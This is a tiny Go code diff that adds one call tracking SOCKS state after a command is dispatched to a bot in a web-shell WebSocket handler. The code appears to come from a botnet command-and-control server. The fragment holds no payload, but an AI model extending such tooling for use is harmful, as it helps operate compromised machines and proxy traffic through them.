@@ -216,6 +216,7 @@ func handleWebShellWS(w http.ResponseWriter, r *http.Request) {
 		}
 
 		sendToSingleBot(botID, cmd)
+		trackSocksState(cmd, botID)
 	}
 }
 
